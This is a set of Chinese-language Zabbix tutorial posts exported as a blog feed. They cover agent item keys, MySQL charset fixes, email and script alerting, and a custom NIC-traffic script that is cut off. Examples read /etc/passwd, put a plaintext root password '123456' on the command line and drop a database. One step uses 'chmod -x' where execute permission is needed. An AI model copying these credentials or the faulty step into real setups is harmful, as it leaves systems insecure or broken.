&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;system.sw.os[]&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;返回系统信息字符串&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;info - full (default), short ,name&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;范例: system.sw.os[short] Ubuntu 2.6.35-28.50-generic 2.6.35.11&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;信息来自如下文件：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/proc/version [short]&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/proc/version_signature [name]&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/etc/issue.net &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;system.sw.packages[,,]&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;已安装软件列表文本值&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;package - all (默认)或者正则表达式&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;manager - all (默认) or a package manager&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;format - full (默认) ，short&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;范例: system.sw.packages[mini,dpkg,short] &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;system.swap.in[,]&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;交换分区IN（磁盘交换到内存）数字&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;device - 交换分区设备 (默认all)&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;type - 可选值: count (swapins数量), sectors(sectors swapped in), pages (pages swapped in).&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;示例key: system.swap.in[,pages]&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;数据采集自: Linux 2.4: /proc/swaps, /proc/partitions, /proc/stat&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux 2.6: /proc/swaps, /proc/diskstats, /proc/vmstat &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;system.swap.out[,]&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Swap out (f内存到磁盘) .数字&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;device - swap设备 (默认all)&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;type - count (number of swapouts), sectors(sectors swapped out), pages (pages swapped out).&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;示例key: system.swap.out[,pages]&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;数据采集自: Linux 2.4: /proc/swaps, /proc/partitions, /proc/stat&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux 2.6: /proc/swaps, /proc/diskstats, /proc/vmstat &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;system.swap.size[,]&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;交换分区大小字节或者百分比&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;device - 交换分区 (默认值 all)&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;type - free (free swap space, default), pfree (free swap space, in percent), pused (used swap space, in percent), total (total swap space), used (used swap space)&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;示例 system.swap.size[,pfree] – 空闲swap百分比 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;system.uname&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;返回主机相信信息.字符串 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;system.uptime&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;系统运行时长(秒)多少秒使用s/uptime来获取 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;system.users.num&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;登陆用户数量多少用户agent使用who命令获取 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;vfs.dev.read[,,]&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;磁盘读取状态整数，浮点数（如果type为如下）&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;device - 磁盘设备 (默认值 “all”)&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;type - 可选值:sectors, operations, bytes, sps, ops, bps(必须指定, 不同操作系统下不同). sps, ops, bps stand for: sectors, operations, bytes per second, respectively&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;mode - 可选值: avg1, avg5, avg15.&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;备注: 只有type为sps, ops, bps的时候，第三个参数才被支持。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;不同操作系统的TYPE参数： FreeBSD – bps Linux – sps OpenBSD – operations Solaris – bytes&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;示例key: vfs.dev.read[,operations] &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;vfs.dev.write[,,]&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;磁盘写入状态整数，&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;device - 磁盘设备 (默认 all)&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;type - sectors, operations, bytes, sps, ops, bps&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;mode - one of avg1 (default),avg5 , avg15.&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;example: vfs.dev.write[,operations] Old naming: io &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;vfs.file.cksum[file]&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;计算文件校验 UNIX cksum.&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;file - 文件完整路径 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;vfs.file.contents[file,]&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;获取文本内容若为空，只返回 LF/CR characters.&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;file - 文件完整路径&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;例如: vfs.file.contents[/etc/passwd] 文件不可以超过64KB. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;vfs.file.exists[file]&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;检测文件是否存在1 – 存在 0 – 不存在&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;file - 文件完整路径 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;vfs.file.md5sum[file]&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;文件MD5校验码文件MD5哈希值&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;file - 完整路径 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;vfs.file.regexp[file,regexp,,,,]&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;文件中搜索字符串包含字符串的行，或者为空&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;file - 文件完整路径&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;regexp - GNU正则表达式&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;encoding - 编码&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;start line - 从哪一行开始，默认第一行&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;end line - 从哪一行结束，默认最后一行&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如: vfs.file.regexp[/etc/passwd,zabbix]&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;vfs.file.regexp[/path/to/some/file,”([0-9]+)$”,,3,5,\1]&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;vfs.file.regexp[/etc/passwd,^zabbix:.:([0-9]+),,,,\1] &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;vfs.file.regmatch[file,regexp,,,]&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;文件中搜索字符串0 – 未找到 1 – 找到&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;file - 文件完整路径&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;regexp - GNU 正则表达式&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;encoding - 编码&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;start line - 哪行开始，默认第一行&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;end line - 哪行结束，默认最后一行&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;例如: vfs.file.regmatch[/var/log/app.log,error] &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;vfs.file.size[file]&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;文件大小字节fzabbix必须有可读此文件的权限 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;vfs.file.time[file,]&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;文件时间信息Unix 时间戳.&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;mode - modify (默认, 修改时间), access – 最后访问时间, change – 最后改变时间&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;例如: vfs.file.time[/etc/passwd,modify] 备注：文件大小有限制 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;vfs.fs.discovery&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;列出挂载的文件系统 用于lld.JSON对象 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;vfs.fs.inode[fs,]&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;inodes数量数字&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;fs - 文件系统&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;mode - total (默认), free, used, pfree (空闲百分比), pused (使用百分比)&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;例如: vfs.fs.inode[/,pfree] &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;vfs.fs.size[fs,]&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;磁盘空间，返回本地文件系统的使用量字节&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;fs - 文件系统&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;mode - total (默认), free, used, pfree (空闲百分比), pused (使用百分比).&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;例如: vfs.fs.size[/tmp,free] &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;vm.memory.size[]&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;内存大小字节或百分比&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;mode - total (默认), active, anon, buffers, cached, exec, file, free, inactive, pinned, shared, wired, used, pused, available&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;监控项vm.memory.size[] 允许三种类型的参数：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;第一类：包含total - 总内存&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;第二类： 系统指定内存类型:active, anon, buffers, cached, exec, file, free, inactive,pinned, shared, wired.&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;第三类：用户级别，一共使用了多少内存，还有多少内存可用: used, pused, available,pavailable. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;web.page.get[host,,]&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;获取网页内容网页源代码&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;host - 主机名/域名&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;path - 文件地址，默认/&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;port - 端口，默认80返回空字符串表示失败. 例如: web.page.get[ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;web.page.perf[host,,]&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;获取完全加载网页消耗的时长秒，返回0表示失败&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;host - 主机名/域名&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;path - html地址，默认是/&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;port - 端口,默认80 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;web.page.regexp[host,,,,,]&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在网页中搜索字符串 失败则返回空字符 (不匹配).&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;host - 主机名&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;path - html文件路径 (默认值 /)&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;port - 端口 (默认80)&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;regexp - GNU正则表达式&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;length - 返回的最大的字符串数量&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;output - 输出格式模板可选项.]]></content>
      <tags>
        <tag>Zabbix</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Zabbix监控字符集问题]]></title>
    <url>%2F2017%2F08%2F17%2FZabbix%2F10.%20Zabbix%E7%9B%91%E6%8E%A7%E5%AD%97%E7%AC%A6%E9%9B%86%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[Zabbix监控字符集问题&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;zabbix监控中常碰到的字符集问题有三个： 一、图形中显示中文乱码 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;解决方法： 从window主机路径C:\Windows\Fonts下选择一种自己喜欢的字体，如mysh.ttf(雅黑)； 将拷贝出来的字体上传到zabbix server网页文件的fonts目录下，并命名为DejaVuSans.ttf 12[root@zhu1 ~]# mv /var/www/html/fonts/DejaVuSans.ttf /var/www/html/fonts/DejaVuSans.ttf.oldmv /var/www/html/fonts/mysh.ttf /var/www/html/fonts/DejaVuSans.ttf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这样便能解决这个乱码问题 二、历史记录处出现问号乱码 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这与zabbix数据库所使用的字符集有关，解决方法如下： 查看当前的默认字符集 12345678910111213141516171819202122mysql&gt; show create database zabbix;+----------+-------------------------------------------------------------------+| Database | Create Database |+----------+-------------------------------------------------------------------+| zabbix | CREATE DATABASE `zabbix` /*!40100 DEFAULT CHARACTER SET latin1 */ |+----------+-------------------------------------------------------------------+1 row in set (0.00 sec)#安装时在导入三个sql文件时，zabbix数据库中创建的表的字符集也是latin1mysql&gt; show variables like 'character%';+--------------------------+----------------------------+| Variable_name | Value |+--------------------------+----------------------------+| character_set_client | latin1 || character_set_connection | latin1 || character_set_database | latin1 || character_set_filesystem | binary || character_set_results | latin1 || character_set_server | latin1 || character_set_system | utf8 || character_sets_dir | /usr/share/mysql/charsets/ |+--------------------------+----------------------------+8 rows in set (0.00 sec) 这是由于字符集不是utf8引起的，现在的解决方法有两种： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当当前zabbix数据库中已存在一定的数据的解决办法 备份zabbix数据库 1[root@zhu1 ~]# mysqldump -uroot -p123456 zabbix &gt; zabbix.sql 修改备份文件 1[root@zhu1 ~]# sed -i 's/latin1/utf8/g' zabbix.sql 删除zabbix数据库 1mysql&gt; drop database zabbix; 关闭mysql数据库，设置默认字符集 123456[root@zhu1 ~]# vim /etc/my.cnf[mysqld]log-bindatadir=/var/lib/mysqlsocket=/var/lib/mysql/mysql.sockdefault-character-set = utf8 #添加该项 启动mysql并恢复zabbix数据库 1[root@zhu1 ~]# mysql -uroot -p123456 zabbix &lt; zabbix.sql 123456789101112131415161718192021mysql&gt; show create database zabbix;+----------+-----------------------------------------------------------------+| Database | Create Database |+----------+-----------------------------------------------------------------+| zabbix | CREATE DATABASE `zabbix` /*!40100 DEFAULT CHARACTER SET utf8 */ |+----------+-----------------------------------------------------------------+1 row in set (0.00 sec)mysql&gt; show variables like 'character%';+--------------------------+----------------------------+| Variable_name | Value |+--------------------------+----------------------------+| character_set_client | latin1 || character_set_connection | latin1 || character_set_database | utf8 || character_set_filesystem | binary || character_set_results | latin1 || character_set_server | utf8 || character_set_system | utf8 || character_sets_dir | /usr/share/mysql/charsets/ |+--------------------------+----------------------------+8 rows in set (0.00 sec) 访问页面 当安装后发现，则可以： 删除zabbix数据库 设置mysql数据库的默认字符集为utf8 重新创建zabbix数据库并导入三个sql文件 总结：1234567891011--with-charset=CHARSETDefault character set, use one of:binaryarmscii8 ascii big5 cp1250 cp1251 cp1256 cp1257cp850 cp852 cp866 cp932 dec8 eucjpms euckr gb2312 gbk geostd8greek hebrew hp8 keybcs2 koi8r koi8ulatin1 latin2 latin5 latin7 macce macromansjis swe7 tis620 ucs2 ujis utf8--with-extra-charsets=CHARSET,CHARSET,...Use charsets in addition to default (none, complex,all, or a list selected from the above sets) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;上面这两个是编译安装mysql事对字符集设置的参数，当不进行设置时默认便是latin1，]]></content>
      <tags>
        <tag>Zabbix</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Zabbix事件通知]]></title>
    <url>%2F2017%2F08%2F17%2FZabbix%2F8.%20Zabbix%E4%BA%8B%E4%BB%B6%E9%80%9A%E7%9F%A5%2F</url>
    <content type="text"><![CDATA[Zabbix事件通知&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;监控项也扯了，触发器也做了，也确实收到告警了，但是你得一直坐屏幕前面盯着啊，你总得休息吧。总得回家吧。那么对应的我触发器触发了我就得做点什么了，比如发报警邮件或者短信等等。运维工程师又不是服务器保安，没必要天天坐在监控机旁边守着。。 通知事件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;定义一个通知介质： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这个介质可以是邮件，shell脚本，也可以是sms短信，遇到紧急的问题的时候，一个短信往往可能是比一封邮件更有效的办法。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;配置Actions： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Actions顾名思义，就是动作，行动。Actions由Conditions（条件）和operation（操作）组成。当满足特定的执行条件的时候就会采取对应的操作，这就是action。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;我们现在创建的是trigger的action，对应的还有自动发现的，注册事件的，内部事件的action。 Name：action的名字 Default Subject：报警通知的主题，如果你发邮件的话就是邮件主题 Default Messages：通知内容，如果你发的是邮件的话就是邮件内容。 Recovery message：这个东西勾上，如果故障恢复了的话也会发送通知 Recovery subject：恢复主题 Recovery subject：：恢复信息 Enabled：应用，生效。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Condition: Type of calculation：条件之间的关系，有AND/OR，AND，OR，与或非这个我就不说了。二者都满足和满足其中一者。 Condition：条件，A为机器不在维护状态，B为触发器状态为PROBLEM New Condition：在这里可以添加更多的条件 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Operations: &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;点击编辑： steps：1-1就是一次，1-10就是发10次（如果故障不恢复才发10次）。如果是1-0的话就代表没有限制的。这个steps可以是多个的。比如与1-10次发给你，5~10次的时候就开始发给你的主管了，11~15次的时候发送给你的部门经理……这就是之前说到的故障升级。故障持续的时间越长，发送的人也不一样。一旦故障级别不一样，能拍板说话算数的人也就不一样了。 step duration：每隔多久操作一次。这个支持故障升级，第一次发给运维，多久没解决后，发给运维主管，多久没解决以后发给运维总监，多久后发给所有人，还没解决你就直接GG，这个的实现就是依靠这个步骤。 操作类型：发送消息、远程命令 send only to：通过什么途径发送，和发送给谁。（Email SMS Jabber） 可以添加用户组和用户，发送给用户组和用户。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;改完了要点更新（add），那个不是最下面的蓝色的更新是，蓝色更新上面那个更新。 通知给谁？&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Adminstrator→Media Type设置媒介类型→create media type，进行新的媒体类型的添加。比如添加一个send_sms的媒体类型拥有自定义媒体类型。]]></content>
      <tags>
        <tag>Zabbix</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[zabbix 配置邮件告警]]></title>
    <url>%2F2017%2F08%2F17%2FZabbix%2F9.%20zabbix%20%E9%85%8D%E7%BD%AE%E9%82%AE%E4%BB%B6%E5%91%8A%E8%AD%A6%2F</url>
    <content type="text"><![CDATA[zabbix 配置邮件告警&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;设置触发器的目的是为了让监控的服务实现告警，下面来配置一下邮件告警。发邮件是服务器通过子机的 sendmail 服务发出的，有时候如果配置不合适或者服务没有启动，是发不出邮件的。所以，要先测试一下。 1[root@zabbix ~]# yum install -y sendmail &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;启动服务 1[root@zabbix ~]# /etc/init.d/sendmail start 1[root@zabbix ~]# echo "test mail"|mail -s "testtest" 89429541@qq.com &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果提示 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;安装 1[root@zabbix ~]# yum -y install mailx &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果是虚拟机，很有可能是收不到邮件的，但如果是真机还是可以收到的，只不过有可能在垃圾邮件箱里。下面来配置 zabbix 的邮件告警。 12[root@zabbix ~]# mkdir -p /home/zabbix/bin[root@zabbix ~]# vim /home/zabbix/bin/baojing.sh &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;内容为 12#!/bin/bashecho "$3"|/bin/mail -s "$2" $1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;保存后，修改文件的权限 1[root@zabbix ~]# chmod -x /home/zabbix/bin/baojing.sh &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在 /etc/zabbix_server.conf 配置文件中，有参数 AlertScriptePath 和 ExternalScripts ，编辑它 1[root@zabbix ~]# vim /etc/zabbix_server.conf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改如下内容 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改为（用户自定义的 media type 脚本） &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改为（用户自定义的检测的脚本 item） &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下面在浏览器里面继续配置邮件告警 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;创建 mediea type： “administration”（管理） –&gt; “Media type”（警示媒体类型） &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;点击右上角 “Create Media Type”（创建警示媒体类型） &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;其中 Description（描述） 填 “baojing” 或其他自定义名称 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Type（类型） 选择 “Script”（脚本） &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Script 填 “baojing.sh” 然后点 “Save”（存档） &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;创建 user：“Administration”（管理）–&gt; “User”（用户） &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在右上角，选择 “Users”（用户），点击 “Create User”（创建用户） &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;alias（别名）：test1，自定义 name（名称） 和 lastname（姓氏） password（密码）：123456； group（组） 选择 guest &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;回到上面点一下 media type（示警媒体） &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;选择 baojing ，send to（收件人） 写要发送邮件的邮箱，点 add（添加） &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;最后点 save（存档） &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;创建action: “configuration”（配置） –&gt; actions（动作） &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;右上角“Create Actions”（创建动作） &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; Name（名称）自定义，我这里写”baojing”,其他默认 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后点右侧的“Operations”（操作）下的“New”（新的）按钮 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;“Operation Type”（操作类型）选择“Send message”（送出消息） &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;“Send Message to”（送到用户组）选择一个或多个要发送消息的用户组 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Send to Users选择我们之前新增的test1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;“Send only to”（仅送到）选择baojing &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;点一下add，最后点save]]></content>
      <tags>
        <tag>Zabbix</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Zabbix脚本报警介质自定义]]></title>
    <url>%2F2017%2F08%2F17%2FZabbix%2F7.%20Zabbix%E8%84%9A%E6%9C%AC%E6%8A%A5%E8%AD%A6%E4%BB%8B%E8%B4%A8%E8%87%AA%E5%AE%9A%E4%B9%89%2F</url>
    <content type="text"><![CDATA[Zabbix脚本报警介质自定义&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;zabbix支持mail报警，sms报警，以及自定义报警，用到最多的还是脚本报警，当事件通知到脚本，会传递给脚本三个参数。 $1：发送给谁 $2：标题 $3：报警内容 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;添加媒介类型：Adminstrator→Media Type→Add &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;那么上面提到的sms.sh放在哪里呢？ 1234567891011[root@aliyun-test ~]# cd /usr/lib/zabbix/alertscripts/[root@aliyun-test alertscripts]# vim sms.sh#!/bin/bashALERT_TO=$1ALERT_TITLE=$2ALERT_BODY=$3echo $ALERT_TO &gt;&gt; /tmp/sms.logecho $ALERT_TITLE &gt;&gt; /tmp/sms.logecho $ALERT_BODY &gt;&gt; /tmp/sms.log[root@aliyun-test alertscripts]# chmod +x ./sms.sh &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;上面这个目录在zabbix的server配置段有定义，定义内容如下： 123456789### Option: AlertScriptsPath# Full path to location of custom alert scripts.# Default depends on compilation options.## Mandatory: no# Default:# AlertScriptsPath=$&#123;datadir&#125;/zabbix/alertscriptsAlertScriptsPath=/usr/lib/zabbix/alertscripts &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;添加Actions： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改用户的媒体类型： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;添加完了以后，还记得我们之前添加过得nginx.active&gt;10的触发器么。这里去触发一下触发器然后观察event事件。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;我们发现他在发信息呢。看看我们定义的/tmp下的sms.log有没有内容呢： 12345678910[root@aliyun-test ~]# tail -F /tmp/sms.log test@admin.comPROBLEM: 当nginx的动态连接数大于10的话我就报警 Original event ID: 454*:*UNKNOWN*): *UNKNOWN*1test@admin.comPROBLEM: 当nginx的动态连接数大于10的话我就报警 Original event ID: 455*:*UNKNOWN*): *UNKNOWN*9test@admin.comPROBLEM: 当nginx的动态连接数大于10的话我就报警 Original event ID: 456*:*UNKNOWN*): *UNKNOWN*4 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可以发现确实写入到文本了。那么在实际的应用中我们就可以使用传过来的$1 $2 $3这三个来灵活的去处理了。只要获取到这个内容我们就可以按照自己的要求去处理了，不管你是发短信还是发邮件都是OK的。这取决于你的脚本到底是怎么写的。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;关于短信发送的相关信息我们可以参考阿里大于，在阿里大于的帮助平台提供有短信发送的API以及相关参数。当然也可以使用Curl来完成，不过就是稍微有点麻烦就是了。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;实践需要注意的一些内容： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Actions中定义的内容都是我们要收到的内容，如果你使用邮件这应该问题不大，不过你要是使用短信的话你就需要注意点了。因为在国内一条短信的长度是有限制的，搞不好一条短信发不完还得分开好几条发送，如果告警多了这个花销也是不可小看的。因此我们可以把actions改造一下，其实获取关键信息就足够了，定位机器，定位故障等。]]></content>
      <tags>
        <tag>Zabbix</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[zabbix2.2 使用自定义脚本监控网卡流量]]></title>
    <url>%2F2017%2F08%2F17%2FZabbix%2F5.%20zabbix2.2%20%E4%BD%BF%E7%94%A8%E8%87%AA%E5%AE%9A%E4%B9%89%E8%84%9A%E6%9C%AC%E7%9B%91%E6%8E%A7%E7%BD%91%E5%8D%A1%E6%B5%81%E9%87%8F%2F</url>
    <content type="text"><![CDATA[zabbix2.2 使用自定义脚本监控网卡流量 在客户端修改配置文件 /etc/zabbix/zabbix_agentd.conf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;需要改动两个地方： UnsafeUserParameters=1 UserParameter=my.net.if &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/usr/local/sbin/zabbix/net.sh $1 $2 //其中UserParameter用来自定义键值，（类似于net.if.in)，自己写的脚本往往会有参数，所以需要加。这是固定写法，如果脚本压根就没有什么参数，那么这个就省了。逗号后面就是我们写的脚本的路径了，再后面就是要用到的参数，有几个就写几。 编写脚本 1vi /usr/local/sbin/zabbix/net.sh &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;内容如下 12345678910111213141516171819202122232425262728293031#!/bin/basheth=$1io=$2net_file="/proc/net/dev"if [ $2 == "in" ]then n_new=`grep "$eth" $net_file|awk '&#123;print $2&#125;'` n_old=`tail -1 /tmp/neti.log` n=`echo 